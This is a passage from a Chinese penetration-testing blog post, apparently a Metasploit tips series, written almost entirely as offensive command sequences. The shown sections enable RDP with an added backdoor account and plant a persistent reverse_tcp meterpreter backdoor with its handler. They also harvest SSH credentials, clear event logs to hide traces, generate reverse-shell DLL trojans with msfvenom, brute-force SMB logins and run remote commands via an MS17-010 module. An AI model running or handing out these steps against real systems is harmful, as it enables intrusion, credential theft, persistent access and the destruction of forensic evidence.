+<h2 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a><strong>开启远程桌面</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">开启远程桌面<br><span class="hljs-built_in">run</span> post/windows/manage/enable_rdp<br>添加用户<br><span class="hljs-built_in">run</span> post/windows/manage/enable_rdp <span class="hljs-attribute">USERNAME</span>=gugugu <span class="hljs-attribute">PASSWORD</span>=Root123456789 将3389端口转发到6662端口<br><span class="hljs-built_in">run</span> post/windows/manage/enable_rdp <span class="hljs-attribute">FORWARD</span>=<span class="hljs-literal">true</span> <span class="hljs-attribute">LPORT</span>=6662<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="cmdshell-升级"><a href="#cmdshell-升级" class="headerlink" title="cmdshell****升级"></a><strong>cmdshell****升级</strong></h2><figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">查看全部会话<br>sessions<br>选择会话<span class="hljs-number">1</span><br>sessions <span class="hljs-number">1</span><br>升级meterpreter<br>sessions -u 会话<span class="hljs-built_in">id</span><br></code></pre></div></td></tr></table></figure>
+
+<h2 id="持久化控制后门"><a href="#持久化控制后门" class="headerlink" title="持久化控制后门"></a><strong>持久化控制后门</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> persistence -X -i 50 -p 4444 -r 192.168.1.7<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp <span class="hljs-built_in">set</span> LHOST 192.168.109.137<br><span class="hljs-built_in">set</span> LPORT 4444<br>exploit<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="针对linux平台"><a href="#针对linux平台" class="headerlink" title="针对linux平台"></a><strong>针对<strong><strong>linux</strong></strong>平台</strong></h2><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">目标主机保存的ssh身份验证信息<br><span class="hljs-keyword">run</span><span class="language-bash"> post/multi/gather/ssh_creds</span><br></code></pre></div></td></tr></table></figure>
+
+<h2 id="擦屁股、清痕迹"><a href="#擦屁股、清痕迹" class="headerlink" title="擦屁股、清痕迹"></a><strong>擦屁股、清痕迹</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">删除添加的账号<br>C:\Windows\system32&gt; net<span class="hljs-built_in"> user </span>添加的用户名 /del 删除日志<br>clearev<br>关闭所有session连接<br>sessions -K<br>事件日志<br>    查看事件日志<br>    <span class="hljs-built_in">run</span> event_manager -i<br>    <br>    清除事件日志<br>	<span class="hljs-built_in">run</span> event_manager -c<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a><strong>生成木马</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">exe<br>	msfvenom<br>dll<br>	64位：<br>    msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=IP <span class="hljs-attribute">LPORT</span>=4444 -f dll &gt; bd64.dll <br>    32位：<br>    msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=IP <span class="hljs-attribute">LPORT</span>=4444 -f dll &gt; bd32.dll<br><br></code></pre></div></td></tr></table></figure>
+
+<h1 id="爆破SMB："><a href="#爆破SMB：" class="headerlink" title="爆破SMB："></a>爆破SMB：</h1><figure class="highlight prolog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs prolog"><span class="hljs-symbol">SMB</span> 对应的端口是 <span class="hljs-number">445</span><br><br>使用的是这个模块 ： uxiliary/scanner/portscan/tcp<br><br>msf5 auxiliary(scanner/portscan/tcp) &gt; exploit<br><br><span class="hljs-number">7</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">26</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">10</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">8</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">56</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">21</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">9</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">77</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">30</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">10</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">103</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">40</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">11</span> [+] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>: - <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>:<span class="hljs-number">445</span> - <span class="hljs-symbol">TCP</span> <span class="hljs-symbol">OPEN</span><br><span class="hljs-number">12</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">128</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">50</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">13</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">155</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">60</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">14</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">180</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">70</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">15</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">205</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">80</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">16</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">231</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">90</span><span class="hljs-comment">% complete)</span><br><span class="hljs-number">17</span> [*] <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>/<span class="hljs-number">24</span>: - <span class="hljs-symbol">Scanned</span> <span class="hljs-number">256</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">100</span><span class="hljs-comment">% complete)</span><br><br>[*] <span class="hljs-symbol">Auxiliary</span> module execution completed<br><br>这边是有一台扫描出结果： <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span>:<span class="hljs-number">445</span> - <span class="hljs-symbol">TCP</span> <span class="hljs-symbol">OPEN</span><br><br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250127112115383.png" srcset="/img/loading.gif" lazyload alt="image-20250127112115383"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">爆破<span class="hljs-built_in"> SMB </span>，爆破这个<span class="hljs-built_in"> IP </span>192.168.136.130:445<br>use auxiliary/scanner/smb/smb_login<br>设置完必要参数之后直接<span class="hljs-built_in">run</span><br>爆破出来密码为123456<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250127112219796.png" srcset="/img/loading.gif" lazyload alt="image-20250127112219796"></p>
+<h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a><strong>远程命令执行</strong></h2><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">有了 IP <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.130</span> , 账号 <span class="hljs-keyword">admin</span> ， 密码 <span class="hljs-number">123456</span> 之后，就可以使用 msf 的模块来<br>造成远程命令执行：<br>使用这个模块 auxiliary/<span class="hljs-keyword">admin</span>/smb/ms17_010_command<br>&gt;&gt;msf5 auxiliary(<span class="hljs-keyword">admin</span>/smb/ms17_010_command) &gt; <span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br>设置SMBPass还有command<br>run<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250127112352418.png" srcset="/img/loading.gif" lazyload alt="image-20250127112352418"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+    
+
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
